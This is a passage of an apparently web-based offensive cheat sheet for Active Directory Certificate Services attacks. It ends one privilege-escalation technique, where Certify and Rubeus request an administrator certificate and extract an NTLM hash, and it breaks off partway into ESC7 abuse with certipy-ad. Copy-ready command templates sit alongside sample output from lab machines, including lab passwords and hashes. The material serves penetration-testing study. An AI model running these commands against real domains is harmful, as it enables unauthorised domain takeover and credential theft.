<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\Certify.exe request --ca <span class="o editable-keyword">&lt;DOMAIN_NETBIOS_NAME&gt;</span>\<span class="o editable-keyword">&lt;CA&gt;</span> --template <span class="o editable-keyword">&lt;VULN_TEMPLATE&gt;</span> --upn <span class="o editable-keyword">&lt;TARGET_USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span> --sid <span class="o editable-keyword">&lt;SID&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="go">evil-winrm-py PS C:\Users\Clifford.Davey\Documents&gt; .\Certify.exe request --ca dc.sendai.vl\sendai-DC-CA --template SendaiComputer --upn administrator@sendai.vl --sid S-1-5-21-3085872742-570972823-736764132-500
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">   _____          _   _  __          
</span></span></span><span class="line"><span class="cl"><span class="go">  / ____|        | | (_)/ _|         
</span></span></span><span class="line"><span class="cl"><span class="go"> | |     ___ _ __| |_ _| |_ _   _    
</span></span></span><span class="line"><span class="cl"><span class="go"> | |    / _ \ '__| __| |  _| | | |   
</span></span></span><span class="line"><span class="cl"><span class="go"> | |___|  __/ |  | |_| | | | |_| |   
</span></span></span><span class="line"><span class="cl"><span class="go">  \_____\___|_|   \__|_|_|  \__, |   
</span></span></span><span class="line"><span class="cl"><span class="go">                             __/ |   
</span></span></span><span class="line"><span class="cl"><span class="go">                            |___./   
</span></span></span><span class="line"><span class="cl"><span class="go">  v2.0.0                         
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Action: Request a certificate
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Current user context    : SENDAI\Clifford.Davey
</span></span></span><span class="line"><span class="cl"><span class="go">[*] No subject name specified, using current context as subject.
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Template                : SendaiComputer
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Subject                 : CN=Clifford Davey, OU=staff, DC=sendai, DC=vl
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Subject Alt Name(s)     : administrator@sendai.vl
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Sid Extension           : S-1-5-21-3085872742-570972823-736764132-500
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Certificate Authority   : dc.sendai.vl\sendai-DC-CA
</span></span></span><span class="line"><span class="cl"><span class="go">[*] CA Response             : The certificate has been issued.
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Request ID              : 19
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Certificate (PFX)       :
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">MIACAQMwgAYJKoZIhvcNAQcBoIAkgASCA+gwgDCABgkqhkiG9w---[SNIP]---BmAGYAbwByAGQAIABEAGEAdgBlAHkAAAAAAAAAAAAAAAAAAAAA
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Certify completed in 00:00:04.0930718
</span></span></span></div></pre></div><h4 id="4-get-ntlm-hash">4. Get NTLM Hash</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\rubeus.exe asktgt /user:<span class="o editable-keyword">&lt;TARGET_USER&gt;</span> /certificate:<span class="o editable-keyword">&lt;BASE64_PFX&gt;</span> /ptt /nowrap /getcredentials
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="go">evil-winrm-py PS C:\Users\Clifford.Davey\Documents&gt; .\rubeus.exe asktgt /user:administrator /certificate:MIACAQMwgAYJKoZIhvcNAQcBoIAkgASCA+gwgDCABgkqhkiG9w---[SNIP]---BmAGYAbwByAGQAIABEAGEAdgBlAHkAAAAAAAAAAAAAAAAAAAAA /ptt /nowrap /getcredentials
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">   ______        _                      
</span></span></span><span class="line"><span class="cl"><span class="go">  (_____ \      | |                     
</span></span></span><span class="line"><span class="cl"><span class="go">   _____) )_   _| |__  _____ _   _  ___ 
</span></span></span><span class="line"><span class="cl"><span class="go">  |  __  /| | | |  _ \| ___ | | | |/___)
</span></span></span><span class="line"><span class="cl"><span class="go">  | |  \ \| |_| | |_) ) ____| |_| |___ |
</span></span></span><span class="line"><span class="cl"><span class="go">  |_|   |_|____/|____/|_____)____/(___/
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  v2.3.3 
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Action: Ask TGT
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Got domain: sendai.vl
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Using PKINIT with etype rc4_hmac and subject: CN=Clifford Davey, OU=staff, DC=sendai, DC=vl 
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Building AS-REQ (w/ PKINIT preauth) for: 'sendai.vl\administrator'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Using domain controller: fe80::e0ed:1e1a:d300:7c8c%8:88
</span></span></span><span class="line"><span class="cl"><span class="go">[+] TGT request successful!
</span></span></span><span class="line"><span class="cl"><span class="go">[*] base64(ticket.kirbi):
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">      doIGQjCCBj6gAwIBBaEDAgEWooIFWzCCBVdhggVTMIIFT6ADAg---[SNIP]---kuVkypHjAcoAMCAQKhFTATGwZrcmJ0Z3QbCXNlbmRhaS52bA==
</span></span></span><span class="line"><span class="cl"><span class="go">[+] Ticket successfully imported!
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  ServiceName              :  krbtgt/sendai.vl
</span></span></span><span class="line"><span class="cl"><span class="go">  ServiceRealm             :  SENDAI.VL
</span></span></span><span class="line"><span class="cl"><span class="go">  UserName                 :  administrator (NT_PRINCIPAL)
</span></span></span><span class="line"><span class="cl"><span class="go">  UserRealm                :  SENDAI.VL
</span></span></span><span class="line"><span class="cl"><span class="go">  StartTime                :  10/29/2025 1:57:24 AM
</span></span></span><span class="line"><span class="cl"><span class="go">  EndTime                  :  10/29/2025 11:57:24 AM
</span></span></span><span class="line"><span class="cl"><span class="go">  RenewTill                :  11/5/2025 12:57:24 AM
</span></span></span><span class="line"><span class="cl"><span class="go">  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
</span></span></span><span class="line"><span class="cl"><span class="go">  KeyType                  :  rc4_hmac
</span></span></span><span class="line"><span class="cl"><span class="go">  Base64(key)              :  kxrSerUVgUOgdHEO2pBeGw==
</span></span></span><span class="line"><span class="cl"><span class="go">  ASREP (key)              :  5AAA0A9A6EF8DA2084C889F71D028796
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Getting credentials using U2U
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  CredentialInfo         :
</span></span></span><span class="line"><span class="cl"><span class="go">    Version              : 0
</span></span></span><span class="line"><span class="cl"><span class="go">    EncryptionType       : rc4_hmac
</span></span></span><span class="line"><span class="cl"><span class="go">    CredentialData       :
</span></span></span><span class="line"><span class="cl"><span class="go">      CredentialCount    : 1
</span></span></span><span class="line"><span class="cl"><span class="go">       NTLM              : CFB106FEEC8B89A3D98E14DCBE8D087A
</span></span></span></div></pre></div></div></div>

<p></p>
<hr>
<h3 id="esc7-dangerous-permissions-on-ca">ESC7: Dangerous Permissions on CA</h3>
<p class="tabs">
<button data-tabset="set10" data-tabcontent="tab1" class="active">Linux</button>

</p><div class="tabset-wrapper" data-tabset-group="set10"><div class="tabcontent active" data-tabset="set10" data-tabcontent="tab1"><h4 id="1-use-manageca-privilege-to-add-manage-certificates-permission">1. Use ManageCA Privilege to Add Manage Certificates Permission</h4>
<div class="highlight password codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad ca -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -add-officer '<span class="o editable-keyword">&lt;USER&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad ca -u <span class="s1">'raven'</span> -p <span class="s1">'R4v3nBe5tD3veloP3r!123'</span> -target dc01.manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -add-officer <span class="s1">'raven'</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
</span></span></span></div></pre></div><div class="highlight ntlm codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad ca -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -hashes '<span class="o editable-keyword">&lt;HASH&gt;</span>' -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -add-officer '<span class="o editable-keyword">&lt;USER&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad ca -u <span class="s1">'raven'</span> -hashes <span class="s1">'1635e153d4d6541a6367ec7a369d1fc7'</span> -target dc01.manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -add-officer <span class="s1">'raven'</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
</span></span></span></div></pre></div><div class="highlight password-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad ca -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -add-officer '<span class="o editable-keyword">&lt;USER&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad ca -u <span class="s1">'raven@manager.htb'</span> -p <span class="s1">'R4v3nBe5tD3veloP3r!123'</span> -k -target dc01.manager.htb -dc-host dc01.manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -add-officer <span class="s1">'raven'</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
</span></span></span></div></pre></div><div class="highlight ntlm-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad ca -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -hashes '<span class="o editable-keyword">&lt;HASH&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -add-officer '<span class="o editable-keyword">&lt;USER&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad ca -u <span class="s1">'raven@manager.htb'</span> -hashes <span class="s1">'1635e153d4d6541a6367ec7a369d1fc7'</span> -k -target dc01.manager.htb -dc-host dc01.manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -add-officer <span class="s1">'raven'</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
</span></span></span></div></pre></div><div class="highlight ticket-based-kerberos codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Ticket-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad ca -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -add-officer '<span class="o editable-keyword">&lt;USER&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad ca -u <span class="s1">'raven@manager.htb'</span> -k -target dc01.manager.htb -dc-host dc01.manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -add-officer <span class="s1">'raven'</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
</span></span></span></div></pre></div><h4 id="2-enable-subca-template-optional">2. Enable SubCA Template [Optional]</h4>
<div class="highlight password codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad ca -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -enable-template 'SubCA'
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad ca -u <span class="s1">'raven'</span> -p <span class="s1">'R4v3nBe5tD3veloP3r!123'</span> -target dc01.manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -enable-template <span class="s1">'SubCA'</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'
</span></span></span></div></pre></div><div class="highlight ntlm codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad ca -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -hashes '<span class="o editable-keyword">&lt;HASH&gt;</span>' -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -enable-template 'SubCA'
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad ca -u <span class="s1">'raven'</span> -hashes <span class="s1">'1635e153d4d6541a6367ec7a369d1fc7'</span> -target dc01.manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -enable-template <span class="s1">'SubCA'</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'
</span></span></span></div></pre></div><div class="highlight password-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad ca -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -enable-template 'SubCA'
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad ca -u <span class="s1">'raven@manager.htb'</span> -p <span class="s1">'R4v3nBe5tD3veloP3r!123'</span> -k -target dc01.manager.htb -dc-host dc01.manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -enable-template <span class="s1">'SubCA'</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[!] KRB5CCNAME environment variable not set
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'
